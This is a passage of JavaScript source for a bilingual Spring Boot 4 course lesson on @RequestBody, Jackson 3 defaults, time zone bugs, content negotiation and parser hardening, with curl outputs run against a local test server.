const OUT43_TIME = out("# server chạy với TZ=Asia/Ho_Chi_Minh\n$ curl localhost:8080/times\n{\"instant\":\"2026-11-20T01:00:00Z\",\"localDateTime\":\"2026-11-20T08:00:00\",\"offsetDateTime\":\"2026-11-20T08:00:00+07:00\",\"zonedDateTime\":\"2026-11-20T08:00:00+07:00\",\"localDate\":\"2026-11-20\",\"duration\":\"PT1H30M\",\"legacyDate\":\"2026-11-20T01:00:00.000Z\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":2,\"startAt\":\"2026-11-20T08:00:00+07:00\"}'\n{\"timestamp\":\"2026-11-18T17:45:05.429Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/bookings\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":2,\"endAt\":\"2026-11-20T08:00:00\"}'\n{\"timestamp\":\"2026-11-18T17:45:05.442Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/bookings\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":2,\"endAt\":\"2026-11-20T08:00:00+07:00\"}'\n{\"labCode\":\"AI-01\",\"seats\":2,\"startAt\":null,\"endAt\":\"2026-11-20T01:00:00Z\",\"serverSees\":\"BookingRequest[labCode=AI-01, seats=2, startAt=null, endAt=2026-11-20T01:00:00Z]\"}");
const OUT43_UTC = out("# server chạy với TZ=UTC (mặc định của container Docker)\n$ curl localhost:8080/times\n{\"instant\":\"2026-11-20T01:00:00Z\",\"localDateTime\":\"2026-11-20T01:00:00\",\"offsetDateTime\":\"2026-11-20T01:00:00Z\",\"zonedDateTime\":\"2026-11-20T01:00:00Z\",\"localDate\":\"2026-11-20\",\"duration\":\"PT1H30M\",\"legacyDate\":\"2026-11-20T01:00:00.000Z\"}");
const OUT43_NEG = out("$ curl -i localhost:8080/labs\nHTTP/1.1 200 \nContent-Type: application/json\nContent-Length: 97\n\n[{\"code\":\"AI-01\",\"name\":\"Lab AI\",\"capacity\":30},{\"code\":\"IOT-02\",\"name\":\"Lab IoT\",\"capacity\":24}]\n$ curl -i localhost:8080/labs -H 'Accept: application/xml'\nHTTP/1.1 200 \nContent-Type: application/xml;charset=UTF-8\nContent-Length: 161\n\n<List><item><code>AI-01</code><name>Lab AI</name><capacity>30</capacity></item><item><code>IOT-02</code><name>Lab IoT</name><capacity>24</capacity></item></List>\n$ curl -i localhost:8080/labs -H 'Accept: text/csv'\nHTTP/1.1 406 \nAccept: application/json, application/*+json, application/xml;charset=UTF-8, text/xml;charset=UTF-8, application/*+xml;charset=UTF-8\nContent-Length: 0");
const MA43_CUSTOM = java("@RestController\npublic class CustomController {\n\n    @JsonInclude(JsonInclude.Include.NON_NULL)                 // bỏ trường null khỏi JSON\n    public record DeviceView(\n            @JsonProperty(\"serial_no\") String serialNo,        // đổi tên chỉ cho trường này\n            String name,\n            String note,                                       // null ⇒ không xuất hiện\n            @JsonIgnore String internalLocation,               // không bao giờ ra ngoài\n            Instant lastSeenAt) {}\n\n    @GetMapping(\"/devices/1\")\n    public DeviceView device() {\n        return new DeviceView(\"SN-7781\", \"Router Cisco 2901\", null, \"Tủ B2 - ngăn 3\", Instant.parse(\"2026-11-19T02:15:00Z\"));\n    }\n}");
const OUT43_CUSTOM = out("$ curl localhost:8080/devices/1\n{\"serial_no\":\"SN-7781\",\"name\":\"Router Cisco 2901\",\"lastSeenAt\":\"2026-11-19T02:15:00Z\"}");
const OUT43_SNAKE = out("# chạy với --spring.jackson.property-naming-strategy=SNAKE_CASE\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"lab_code\":\"AI-01\",\"seats\":2,\"end_at\":\"2026-11-20T03:00:00Z\"}'\n{\"lab_code\":\"AI-01\",\"seats\":2,\"start_at\":null,\"end_at\":\"2026-11-20T03:00:00Z\",\"server_sees\":\"BookingRequest[labCode=AI-01, seats=2, startAt=null, endAt=2026-11-20T03:00:00Z]\"}");
const OUT43_DEPTH = out("# d400 = 400 dấu [ rồi 400 dấu ] … big = {\"note\": chuỗi 30 triệu chữ A}\n$ curl -s -o /dev/null -w '%{http_code} %{time_total}s\\n' -H 'Content-Type: application/json' --data-binary @d400.json localhost:8080/echo-depth   # 801 byte\n200 0.004169s\n$ curl -s -o /dev/null -w '%{http_code} %{time_total}s\\n' -H 'Content-Type: application/json' --data-binary @d600.json localhost:8080/echo-depth   # 1201 byte\n400 0.005645s\n$ curl -s -o /dev/null -w '%{http_code} %{time_total}s\\n' -H 'Content-Type: application/json' --data-binary @d1e5.json localhost:8080/echo-depth   # 200001 byte\n400 0.009036s\n$ curl -s -o /dev/null -w '%{http_code} %{time_total}s\\n' -H 'Content-Type: application/json' --data-binary @big.json localhost:8080/echo-depth   # 30000012 byte\n200 0.189341s");
const OUT43_DEPTHLOG = out("WARN … HttpMessageNotReadableException: JSON parse error: Document nesting depth (501) exceeds the maximum allowed (500, from `StreamReadConstraints.getMaxNestingDepth()`)");
const MA43_NODE = js("// body.mjs — Express 5 đọc body JSON (bài 4.3, để so với Spring/Jackson)\nimport express from 'express';\nconst app = express();\napp.use(express.json());                                   // mặc định limit '100kb'\napp.post('/bookings', (req, res) => res.json({ body: req.body ?? null, typeofStartAt: typeof req.body?.startAt }));\napp.post('/echo-depth', (req, res) => res.send('ok'));\napp.use((err, req, res, next) => res.status(err.status ?? 500).json({ error: err.type ?? err.message }));\napp.listen(41861, () => console.log('Express 5 on :41861'));");
const OUT43_NODE = out("$ curl -X POST localhost:3000/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"seats\":\"hai\",\"startAt\":\"2026-11-20T08:00:00\"}'\n{\"body\":{\"labCode\":\"AI-01\",\"seats\":\"hai\",\"startAt\":\"2026-11-20T08:00:00\"},\"typeofStartAt\":\"string\"}\n$ curl -X POST localhost:3000/bookings -H 'Content-Type: text/plain' -d AI-01\n{\"body\":null,\"typeofStartAt\":\"undefined\"}\n$ curl -s -w ' %{http_code}\\n' -H 'Content-Type: application/json' --data-binary @d1e5.json localhost:3000/echo-depth\n{\"error\":\"entity.too.large\"} 413\n$ curl -s -w ' %{http_code}\\n' -H 'Content-Type: application/json' --data-binary @big.json localhost:3000/echo-depth\n{\"error\":\"entity.too.large\"} 413");
const MA43_GIAI = java("/** Lời giải thực hành 4.3: client BẮT BUỘC gửi múi giờ; server lưu và trả Instant (UTC). */\n@RestController\npublic class BookingController {\n\n    public record BookingRequest(String labCode, OffsetDateTime startAt) {}      // \"…T08:00:00\" thiếu múi giờ ⇒ 400\n\n    public record BookingView(String labCode, Instant startAt, String localVietnam) {}\n\n    @PostMapping(value = \"/bookings\", consumes = MediaType.APPLICATION_JSON_VALUE)\n    public BookingView create(@RequestBody BookingRequest req) {\n        Instant start = req.startAt().toInstant();                                // một thời điểm duy nhất trên trục thời gian\n        return new BookingView(req.labCode(), start,\n                start.atZone(java.time.ZoneId.of(\"Asia/Ho_Chi_Minh\")).toLocalDateTime().toString());\n    }\n}");
const OUT43_GIAI = out("$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"startAt\":\"2026-11-20T08:00:00+07:00\"}'\n{\"labCode\":\"AI-01\",\"startAt\":\"2026-11-20T01:00:00Z\",\"localVietnam\":\"2026-11-20T08:00\"}\n$ curl -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"startAt\":\"2026-11-20T01:00:00Z\"}'\n{\"labCode\":\"AI-01\",\"startAt\":\"2026-11-20T01:00:00Z\",\"localVietnam\":\"2026-11-20T08:00\"}\n$ curl -s -o /dev/null -w '%{http_code}\\n' -X POST localhost:8080/bookings -H 'Content-Type: application/json' -d '{\"labCode\":\"AI-01\",\"startAt\":\"2026-11-20T08:00:00\"}'\n400");

const L43_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.3</span>
<h2>@RequestBody, Jackson 3 and content negotiation</h2>
<p class="lead">Every JSON body that reaches your controller has been through a converter, and every object you return goes through one on the way out. Spring Boot 4 ships <strong>Jackson 3</strong> — new package names and several changed defaults that make old Stack Overflow answers wrong. In this lesson we send good and bad bodies to a booking endpoint and read the exact log line for each failure, print the defaults Jackson 3 really uses, find the seven-hour time zone bug that every Vietnamese team meets once, let the <code>Accept</code> header switch the same endpoint between JSON and XML, and attack the parser with deep nesting and a 30&nbsp;MB string.</p>

<h3>In everyday life first</h3>
<p>At an international reception desk, a visitor hands over a form and says two things: "this form is written in Vietnamese" and "please answer me in English". The first sentence is the <code>Content-Type</code> header (what the body I send is), the second is <code>Accept</code> (what I can read back). If the desk has no translator for the form's language it refuses the form — <strong>415 Unsupported Media Type</strong>. If it cannot write the answer in any language the visitor reads — <strong>406 Not Acceptable</strong>. If the form is in the right language but filled in badly (a number field containing words, a missing field) — <strong>400 Bad Request</strong>.</p>

<h3>How a body becomes an object</h3>
<p><code>@RequestBody</code> asks Spring MVC to pick an <strong>HTTP message converter</strong> that can read the request's <code>Content-Type</code> into the parameter's type. For <code>application/json</code> that is the Jackson converter, which uses the application's <code>JsonMapper</code> bean. On the way out, the return value goes through a converter chosen by the <code>Accept</code> header and the converters available — that choice is <strong>content negotiation</strong>.</p>
${MA43_CTRL}
${OUT43_OK}
<p><code>serverSees</code> is the record's <code>toString()</code>: what Java actually received. <code>startAt</code> is a <code>LocalDateTime</code> (no zone), <code>endAt</code> an <code>Instant</code> (a point on the UTC time line). Remember that difference — it comes back below.</p>

<h3>Five ways a body goes wrong</h3>
${OUT43_LOI}
${OUT43_LOG}
<div class="kv-grid">
  <div class="kv"><span class="k">text/plain ⇒ 415</span><span class="v"><code>consumes = APPLICATION_JSON_VALUE</code> and no converter for <code>text/plain</code> into a record. The response even says which type <em>is</em> accepted: <code>Accept: application/json</code>.</span></div>
  <div class="kv"><span class="k">Broken JSON ⇒ 400</span><span class="v">"Unexpected end-of-input". Note "Source: REDACTED" in the full log: Jackson no longer copies the request body into error messages by default — bodies can contain passwords.</span></div>
  <div class="kv"><span class="k">"seats":"hai" ⇒ 400</span><span class="v">A string that is not an <code>int</code>. Unlike Express, the controller never sees it.</span></div>
  <div class="kv"><span class="k">seats missing ⇒ 400</span><span class="v"><strong>New in Jackson 3:</strong> <code>FAIL_ON_NULL_FOR_PRIMITIVES</code> is on, so a missing <code>int</code> is an error. With Jackson 2 (Spring Boot 3) the same request silently gave <code>seats = 0</code>. If a field is optional, use <code>Integer</code>; if it is required, Chapter 5 adds <code>@NotNull</code> with a readable message.</span></div>
  <div class="kv"><span class="k">"isAdmin":true ⇒ 200</span><span class="v">Unknown property, ignored (Spring Boot sets <code>FAIL_ON_UNKNOWN_PROPERTIES = false</code>, lesson 4.2).</span></div>
</div>

<h3>What Jackson 3 really does by default</h3>
${MA43_INFO}
${OUT43_DEF}
<ul>
  <li>The packages moved from <code>com.fasterxml.jackson.databind</code> to <code>tools.jackson.databind</code>; the annotations (<code>@JsonProperty</code>, <code>@JsonIgnore</code>…) kept the old <code>com.fasterxml.jackson.annotation</code> package, so DTO code rarely changes. Copying a Jackson 2 configuration class into a Boot 4 project fails to compile — that is the first sign.</li>
  <li><code>JsonMapper</code> is immutable and built with a builder; Spring Boot exposes the customised one as a bean. Jackson 3 exceptions are unchecked (<code>JacksonException</code> extends <code>RuntimeException</code>).</li>
  <li>Dates are written as ISO-8601 strings (not numbers), Java 8 date/time types work without an extra module, JavaBean properties are sorted alphabetically (records keep component order, as the outputs show), and missing primitives fail.</li>
</ul>

<h3>Dates, times and the seven-hour bug</h3>
${MA43_TIMES}
${OUT43_TIME}
${OUT43_UTC}
<p>The same instant — 08:00 in Hà Nội — written by the same code on two servers. <code>Instant</code>, <code>OffsetDateTime</code>, <code>ZonedDateTime</code> all describe the same moment (the zone is part of the value). <code>LocalDateTime</code> does not: it printed <code>08:00</code> on a server running in Asia/Ho_Chi_Minh and <code>01:00</code> on a server running in UTC — and Docker containers run in UTC unless you say otherwise. A booking created on the developer's laptop at 8 a.m. shows up as 1 a.m. (or 3 p.m., if the conversion goes the other way) once deployed.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Instant</span><span class="v">A point on the UTC time line. Default choice for "when did/will this happen" in APIs and the database (<code>timestamptz</code>).</span></div>
  <div class="kv"><span class="k">OffsetDateTime</span><span class="v">Date-time + offset (<code>+07:00</code>). Good input type: forces the client to say which offset it means.</span></div>
  <div class="kv"><span class="k">LocalDateTime / LocalDate</span><span class="v">Wall-clock values without zone: "the lab opens at 07:00 every day", a birthday. Never a moment in time.</span></div>
  <div class="kv"><span class="k">java.util.Date</span><span class="v">Legacy; Jackson writes it in UTC with milliseconds. Do not use in new code.</span></div>
</div>
<p>Notice the two parsing failures above, both correct: <code>"2026-11-20T08:00:00+07:00"</code> into a <code>LocalDateTime</code> is rejected (Jackson will not silently drop an offset), and <code>"2026-11-20T08:00:00"</code> into an <code>Instant</code> is rejected (an instant without a zone is meaningless).</p>

<h3>Content negotiation: one method, JSON or XML</h3>
<p>Add <code>tools.jackson.dataformat:jackson-dataformat-xml</code> to the classpath and Spring Boot registers an XML converter too. The controller does not change:</p>
${OUT43_NEG}
<p>No <code>Accept</code> (curl sends <code>*/*</code>) ⇒ JSON, the first converter able to write the value. <code>Accept: application/xml</code> ⇒ XML. <code>text/csv</code> ⇒ 406, and the response lists what the server can produce. You can restrict a method with <code>produces = …</code> exactly as <code>consumes</code> restricts input. Real APIs rarely need XML today, but the mechanism matters: it is the same one that serves <code>application/problem+json</code> errors in Chapter 5 and file downloads later.</p>

<h3>Shaping the JSON</h3>
${MA43_CUSTOM}
${OUT43_CUSTOM}
<p>Per field: <code>@JsonProperty</code> renames, <code>@JsonIgnore</code> removes, <code>@JsonInclude(NON_NULL)</code> drops nulls (<code>note</code> disappeared). For the whole application use properties — one line switches every request and response to snake_case:</p>
${OUT43_SNAKE}
<p>Global switches are powerful and dangerous: changing the naming strategy of a live API renames every field for every client. Decide once, at the start of a project, and write it in the API contract (OpenAPI, Chapter 12). For anything the properties cannot express, define a <code>JsonMapperBuilderCustomizer</code> bean so you modify Boot's mapper instead of replacing it (replacing it loses the defaults above).</p>

<h3>🕵️ Hacker corner — the parser is an attack surface</h3>
${OUT43_DEPTH}
${OUT43_DEPTHLOG}
<ul>
  <li><strong>Deep nesting:</strong> 400 levels pass, 600 and 100&nbsp;000 levels are rejected in a few milliseconds: Jackson 3 limits reading to 500 levels (<code>StreamReadConstraints</code>). Recursive parsers without such a limit can be pushed into a stack overflow or into burning CPU with a 200&nbsp;KB request. This is not theory: <strong>CVE-2022-42003</strong> and <strong>CVE-2022-42004</strong> (published 2 October 2022, CVSS 7.5) were resource-exhaustion bugs in jackson-databind via deeply nested arrays; the processing limits were added to Jackson after them.</li>
  <li><strong>Huge bodies:</strong> the 30&nbsp;MB string was accepted with 200. Neither Tomcat nor Jackson stops a JSON body of that size by default, and every concurrent request of that size is 30&nbsp;MB of heap. You must set a limit yourself — lesson 4.4 does it with a filter that answers 413 before Jackson reads a byte; a reverse proxy (<code>client_max_body_size</code> in nginx) is the second layer.</li>
  <li><strong>Polymorphic typing:</strong> <strong>CVE-2017-7525</strong> (CVSS 9.8) — remote code execution when an application let the JSON choose which Java class to instantiate ("default typing"). Dozens of follow-up CVEs found new "gadget" classes. Rule: never enable default typing or <code>@JsonTypeInfo(use = Id.CLASS)</code> on input you do not control; for polymorphism use a sealed interface with a fixed list of names (<code>Id.NAME</code>).</li>
</ul>

<h3>Compared with Node.js</h3>
${MA43_NODE}
${OUT43_NODE}
<p>Express accepts <code>"seats":"hai"</code> and the date string as they are: there are no types to convert to, so validation is your job (zod). A <code>text/plain</code> body is simply not parsed — <code>req.body</code> is <code>undefined</code>, no 415. On the other hand <code>express.json()</code> has a <strong>100&nbsp;KB limit by default</strong> and answers 413 — a safer default than Spring's, which is why the Spring version needs the filter of the next lesson.</p>

<h3>In real life and at work</h3>
<ul>
  <li><strong>"Booked at 8, shows 15:00"</strong> (illustration): the mobile app sends local time without offset, the server stores it as UTC, the web app adds +7 again. Agree in the contract: send ISO-8601 with offset, store <code>timestamptz</code>, return UTC <code>Z</code>, let each client display in its own zone.</li>
  <li><strong>Upgrading Spring Boot 3 ⇒ 4:</strong> custom serializers and <code>ObjectMapper</code> configuration must move to <code>tools.jackson</code>; and requests that used to get <code>0</code> for a missing number now get 400. Run the API test suite before celebrating.</li>
  <li><strong>The 400 nobody understands:</strong> clients only see "Bad Request". Read the WARN line (it names the field and the type), then return a useful error body — Chapter 5.</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"How does Spring turn JSON into an object?"</strong> — <code>@RequestBody</code> ⇒ an <code>HttpMessageConverter</code> selected by <code>Content-Type</code> ⇒ Jackson's <code>JsonMapper</code> deserialises into the parameter type; the response is selected by <code>Accept</code> (content negotiation).</li>
  <li><strong>"415 vs 406 vs 400?"</strong> — Server cannot read that request format / cannot produce any format the client accepts / format understood but content invalid.</li>
  <li><strong>"LocalDateTime or Instant in an API?"</strong> — Instant (or OffsetDateTime as input) for moments; LocalDateTime only for wall-clock values. Store <code>timestamptz</code>. Containers run in UTC.</li>
  <li><strong>"What changed in Jackson 3?"</strong> — <code>tools.jackson</code> packages (annotations unchanged), immutable <code>JsonMapper</code>, unchecked exceptions, ISO dates by default, alphabetical properties, missing primitives fail, built-in java.time.</li>
  <li><strong>"How do you protect a JSON endpoint from abuse?"</strong> — Body size limit (filter/proxy), parser nesting limits, no polymorphic default typing, DTOs with only the fields you expect, validation (Chapter 5).</li>
</ol>

<h3>🧪 Practice (15 minutes)</h3>
<div class="callout ok"><ol>
  <li>Change the booking request so that the client <strong>must</strong> send an offset with <code>startAt</code> (a value without offset ⇒ 400).</li>
  <li>Return <code>startAt</code> as a UTC <code>Instant</code>, plus a field showing the local time in Vietnam.</li>
</ol>
<p><strong>Done when:</strong> <code>08:00+07:00</code> and <code>01:00Z</code> give the same response, and <code>08:00</code> without offset gives 400.</p></div>
${giai('Show one solution', `${MA43_GIAI}
${OUT43_GIAI}`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">HttpMessageConverter</span><span class="v">Reads a request body into an object / writes an object into a response body for a given media type.</span></div>
  <div class="kv"><span class="k">Content-Type / Accept</span><span class="v">Media type of the body sent / media types the client can read back.</span></div>
  <div class="kv"><span class="k">Content negotiation</span><span class="v">Choosing the response format from <code>Accept</code> and the available converters.</span></div>
  <div class="kv"><span class="k">JsonMapper</span><span class="v">Jackson 3's immutable JSON mapper; Spring Boot provides it as a bean.</span></div>
  <div class="kv"><span class="k">ISO-8601</span><span class="v">The date-time text format <code>2026-11-20T01:00:00Z</code>, <code>…+07:00</code>.</span></div>
  <div class="kv"><span class="k">StreamReadConstraints</span><span class="v">Jackson's limits on nesting depth, string length and number length while parsing.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>Content-Type picks the reader (415 if none), Accept picks the writer (406 if none), invalid content is 400 — and the WARN log names the exact reason.</li>
  <li>Jackson 3 in Boot 4: new packages, ISO dates, alphabetical bean properties, missing primitives fail, unknown fields ignored.</li>
  <li>Use Instant/OffsetDateTime for moments; LocalDateTime changes meaning with the server's time zone.</li>
  <li>Nesting is limited for you; body size is not — add a limit.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://github.com/FasterXML/jackson/blob/main/jackson3/MIGRATING_TO_JACKSON_3.md', '🐙', 'Migrating to Jackson 3', 'The official list of renamed packages and changed defaults.')}
${tl('https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/requestbody.html', '🌱', 'Spring Framework — @RequestBody', 'Message converters, validation and how errors are raised.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: JsonApp and GiaiApp on Spring Boot 4.1.2, Jackson 3.1.7 (+ jackson-dataformat-xml 3.1.7), Temurin 21.0.12.1, server time zone Asia/Ho_Chi_Minh and UTC; Express 5.3.0 on Node 22.22.2 (19/11/2026).</li>
  <li>NVD: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42003" target="_blank" rel="noopener">CVE-2022-42003</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-42004" target="_blank" rel="noopener">CVE-2022-42004</a> (02/10/2022), <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7525" target="_blank" rel="noopener">CVE-2017-7525</a>.</li>
</ul>
</div>
`;

const L43_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.3</span>
<h2>@RequestBody, Jackson 3 và content negotiation</h2>
<p class="lead">Mọi body JSON tới được controller của bạn đều đã đi qua một bộ chuyển đổi, và mọi đối tượng bạn trả về cũng đi qua một bộ trên đường ra. Spring Boot 4 đi kèm <strong>Jackson 3</strong> — tên package mới và vài giá trị mặc định đã đổi, làm nhiều câu trả lời cũ trên Stack Overflow thành sai. Trong bài này ta gửi body đúng và sai tới một endpoint đặt lịch rồi đọc đúng dòng log cho từng lỗi, in ra các mặc định Jackson 3 thật sự dùng, tìm lỗi lệch bảy tiếng mà đội nào ở Việt Nam cũng gặp một lần, để header <code>Accept</code> chuyển cùng một endpoint giữa JSON và XML, và tấn công bộ đọc bằng JSON lồng sâu cùng một chuỗi 30&nbsp;MB.</p>

<h3>Đời thường trước đã</h3>
<p>Ở một quầy tiếp khách quốc tế, khách đưa một tờ khai và nói hai điều: "tờ khai này viết bằng tiếng Việt" và "làm ơn trả lời tôi bằng tiếng Anh". Câu đầu là header <code>Content-Type</code> (body tôi gửi là loại gì), câu sau là <code>Accept</code> (tôi đọc được loại gì). Nếu quầy không có ai dịch được ngôn ngữ của tờ khai, quầy từ chối nhận — <strong>415 Unsupported Media Type</strong>. Nếu quầy không viết được câu trả lời bằng bất kỳ thứ tiếng nào khách đọc được — <strong>406 Not Acceptable</strong>. Nếu tờ khai đúng ngôn ngữ nhưng điền sai (ô số mà ghi chữ, thiếu ô) — <strong>400 Bad Request</strong>.</p>

<h3>Body trở thành đối tượng thế nào</h3>
<p><code>@RequestBody</code> yêu cầu Spring MVC chọn một <strong>HTTP message converter</strong> (bộ chuyển đổi thông điệp) đọc được <code>Content-Type</code> của request sang kiểu của tham số. Với <code>application/json</code> đó là bộ chuyển đổi Jackson, dùng bean <code>JsonMapper</code> của ứng dụng. Trên đường ra, giá trị trả về đi qua bộ chuyển đổi được chọn theo header <code>Accept</code> và các bộ chuyển đổi đang có — việc chọn đó gọi là <strong>content negotiation</strong> (thương lượng định dạng).</p>
${MA43_CTRL}
${OUT43_OK}
<p><code>serverSees</code> là <code>toString()</code> của record: thứ Java thật sự nhận được. <code>startAt</code> là <code>LocalDateTime</code> (không có múi giờ), <code>endAt</code> là <code>Instant</code> (một điểm trên trục thời gian UTC). Nhớ khác biệt đó — nó quay lại ở bên dưới.</p>

<h3>Năm kiểu body hỏng</h3>
${OUT43_LOI}
${OUT43_LOG}
<div class="kv-grid">
  <div class="kv"><span class="k">text/plain ⇒ 415</span><span class="v"><code>consumes = APPLICATION_JSON_VALUE</code> và không có bộ chuyển đổi nào đọc <code>text/plain</code> thành record. Response còn nói luôn kiểu nào <em>được</em> nhận: <code>Accept: application/json</code>.</span></div>
  <div class="kv"><span class="k">JSON gãy ⇒ 400</span><span class="v">"Unexpected end-of-input". Để ý "Source: REDACTED" trong log đầy đủ: Jackson mặc định không chép body request vào thông báo lỗi nữa — body có thể chứa mật khẩu.</span></div>
  <div class="kv"><span class="k">"seats":"hai" ⇒ 400</span><span class="v">Một chuỗi không phải <code>int</code>. Khác Express, controller không bao giờ thấy nó.</span></div>
  <div class="kv"><span class="k">Thiếu seats ⇒ 400</span><span class="v"><strong>Mới ở Jackson 3:</strong> <code>FAIL_ON_NULL_FOR_PRIMITIVES</code> bật sẵn, nên thiếu một <code>int</code> là lỗi. Với Jackson 2 (Spring Boot 3), cùng request đó lặng lẽ cho <code>seats = 0</code>. Trường tuỳ chọn thì dùng <code>Integer</code>; trường bắt buộc thì Chương 5 thêm <code>@NotNull</code> với thông báo dễ đọc.</span></div>
  <div class="kv"><span class="k">"isAdmin":true ⇒ 200</span><span class="v">Thuộc tính lạ, bị bỏ qua (Spring Boot đặt <code>FAIL_ON_UNKNOWN_PROPERTIES = false</code>, bài 4.2).</span></div>
</div>

<h3>Jackson 3 thật sự mặc định ra sao</h3>
${MA43_INFO}
${OUT43_DEF}
<ul>
  <li>Package chuyển từ <code>com.fasterxml.jackson.databind</code> sang <code>tools.jackson.databind</code>; các annotation (<code>@JsonProperty</code>, <code>@JsonIgnore</code>…) giữ package cũ <code>com.fasterxml.jackson.annotation</code>, nên mã DTO hiếm khi phải sửa. Chép một class cấu hình Jackson 2 sang dự án Boot 4 sẽ không biên dịch được — đó là dấu hiệu đầu tiên.</li>
  <li><code>JsonMapper</code> bất biến và được dựng bằng builder; Spring Boot đưa bản đã tuỳ biến ra thành bean. Exception của Jackson 3 là unchecked (<code>JacksonException</code> kế thừa <code>RuntimeException</code>).</li>
  <li>Ngày giờ được ghi thành chuỗi ISO-8601 (không phải số), các kiểu ngày giờ Java 8 chạy không cần module thêm, thuộc tính JavaBean được xếp theo chữ cái (record giữ thứ tự thành phần, như output cho thấy), và thiếu kiểu nguyên thuỷ thì lỗi.</li>
</ul>

<h3>Ngày giờ và lỗi lệch bảy tiếng</h3>
${MA43_TIMES}
${OUT43_TIME}
${OUT43_UTC}
<p>Cùng một thời điểm — 8 giờ sáng ở Hà Nội — do cùng một đoạn mã ghi ra trên hai server. <code>Instant</code>, <code>OffsetDateTime</code>, <code>ZonedDateTime</code> đều mô tả cùng một khoảnh khắc (múi giờ là một phần của giá trị). <code>LocalDateTime</code> thì không: nó in <code>08:00</code> trên server chạy múi Asia/Ho_Chi_Minh và <code>01:00</code> trên server chạy UTC — mà container Docker chạy UTC nếu bạn không nói gì. Một lượt đặt tạo trên laptop của lập trình viên lúc 8 giờ sáng, lên server thật thì hiện thành 1 giờ sáng (hoặc 3 giờ chiều, nếu chiều đổi ngược lại).</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Instant</span><span class="v">Một điểm trên trục thời gian UTC. Lựa chọn mặc định cho "chuyện này đã/sẽ xảy ra lúc nào" trong API và cơ sở dữ liệu (<code>timestamptz</code>).</span></div>
  <div class="kv"><span class="k">OffsetDateTime</span><span class="v">Ngày giờ + độ lệch (<code>+07:00</code>). Kiểu đầu vào tốt: buộc client nói rõ ý nó là độ lệch nào.</span></div>
  <div class="kv"><span class="k">LocalDateTime / LocalDate</span><span class="v">Giờ "trên mặt đồng hồ", không múi giờ: "lab mở cửa lúc 07:00 mỗi ngày", ngày sinh. Không bao giờ là một thời điểm.</span></div>
  <div class="kv"><span class="k">java.util.Date</span><span class="v">Kiểu cũ; Jackson ghi nó theo UTC kèm mili giây. Đừng dùng trong mã mới.</span></div>
</div>
<p>Để ý hai lần đọc lỗi ở trên, cả hai đều đúng: <code>"2026-11-20T08:00:00+07:00"</code> vào <code>LocalDateTime</code> bị từ chối (Jackson không lặng lẽ vứt độ lệch), và <code>"2026-11-20T08:00:00"</code> vào <code>Instant</code> bị từ chối (một thời điểm thiếu múi giờ là vô nghĩa).</p>

<h3>Content negotiation: một hàm, JSON hoặc XML</h3>
<p>Thêm <code>tools.jackson.dataformat:jackson-dataformat-xml</code> vào classpath là Spring Boot đăng ký thêm một bộ chuyển đổi XML. Controller không đổi gì:</p>
${OUT43_NEG}
<p>Không có <code>Accept</code> (curl gửi <code>*/*</code>) ⇒ JSON, bộ chuyển đổi đầu tiên ghi được giá trị. <code>Accept: application/xml</code> ⇒ XML. <code>text/csv</code> ⇒ 406, và response liệt kê những gì server sinh được. Bạn có thể giới hạn một hàm bằng <code>produces = …</code> đúng như <code>consumes</code> giới hạn đầu vào. API thật ngày nay hiếm khi cần XML, nhưng cơ chế thì quan trọng: chính nó phục vụ lỗi <code>application/problem+json</code> ở Chương 5 và tải tệp về sau này.</p>

<h3>Nắn hình JSON</h3>
${MA43_CUSTOM}
${OUT43_CUSTOM}
<p>Theo từng trường: <code>@JsonProperty</code> đổi tên, <code>@JsonIgnore</code> loại bỏ, <code>@JsonInclude(NON_NULL)</code> bỏ giá trị null (<code>note</code> đã biến mất). Cho cả ứng dụng thì dùng thuộc tính cấu hình — một dòng chuyển mọi request và response sang snake_case:</p>
${OUT43_SNAKE}
<p>Công tắc toàn cục mạnh và nguy hiểm: đổi kiểu đặt tên của một API đang chạy là đổi tên mọi trường cho mọi client. Quyết một lần, ngay đầu dự án, và ghi vào hợp đồng API (OpenAPI, Chương 12). Thứ gì thuộc tính cấu hình không diễn đạt được thì khai một bean <code>JsonMapperBuilderCustomizer</code> để sửa mapper của Boot thay vì thay hẳn nó (thay hẳn là mất các mặc định ở trên).</p>

<h3>🕵️ Góc hacker — bộ đọc JSON là bề mặt tấn công</h3>
${OUT43_DEPTH}
${OUT43_DEPTHLOG}
<ul>
  <li><strong>Lồng sâu:</strong> 400 tầng qua, 600 và 100&nbsp;000 tầng bị từ chối trong vài mili giây: Jackson 3 giới hạn việc đọc ở 500 tầng (<code>StreamReadConstraints</code>). Bộ đọc đệ quy không có giới hạn này có thể bị đẩy tới tràn ngăn xếp hoặc đốt CPU chỉ bằng một request 200&nbsp;KB. Không phải lý thuyết: <strong>CVE-2022-42003</strong> và <strong>CVE-2022-42004</strong> (công bố 2/10/2022, CVSS 7,5) là lỗi cạn tài nguyên trong jackson-databind qua mảng lồng sâu; các giới hạn xử lý được thêm vào Jackson sau những lỗi đó.</li>
